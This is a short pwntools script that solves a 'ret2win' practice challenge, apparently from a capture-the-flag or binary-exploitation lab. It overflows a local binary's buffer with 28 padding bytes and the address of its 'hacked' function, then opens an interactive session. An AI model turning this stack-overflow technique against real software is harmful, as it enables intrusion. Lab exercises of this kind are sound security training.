from pwn import *

# initial
exe = './ret2win'
elf = context.binary = ELF(exe, checksec=ELF)

# connection
io = process(exe) 

# payload to send
payload = flat(
    28 * b'A',
    elf.functions.hacked
)

# send payload
io.sendlineafter(b':', payload)

# receive output
io.interactive()